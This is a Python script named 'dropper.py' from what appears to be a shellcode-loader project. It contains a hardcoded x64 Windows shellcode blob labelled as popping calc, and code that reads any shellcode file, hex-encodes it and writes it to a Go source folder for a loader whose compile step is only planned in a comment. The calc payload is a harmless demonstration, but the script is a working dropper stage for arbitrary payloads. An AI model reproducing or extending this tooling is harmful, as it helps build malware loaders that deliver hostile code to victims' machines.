'''
Want this to take in bin file as arg and: 
- read in contents -> hexify into ascii 
- write ascii to golang/shelly.txt 
- compile main.go w/ golang os.exec 
'''
import os
import sys
import binascii 

def write_calc(): 
    # popping calc shellcode 
    calcy = b""
    calcy += b"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
    calcy += b"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
    calcy += b"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
    calcy += b"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
    calcy += b"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
    calcy += b"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
    calcy += b"\x48\x83\xec\x20\x41\xff\xd6"

    with open("test_calc.bin", "wb") as f: 
        f.write(calcy)


if __name__ == "__main__":
    if len(sys.argv) != 2: 
        print("Incorrect usage\nUsage: python dropper.py <shell.bin>")
        exit(1)
    
    fname = sys.argv[1]
    with open(fname, "rb") as f: 
        shellcode = f.read()
    
    with open("golang\\shell.txt", "w") as txt: 
        txt_shell = binascii.hexlify(shellcode).decode('utf-8')
        print(txt_shell)
        txt.write(txt_shell)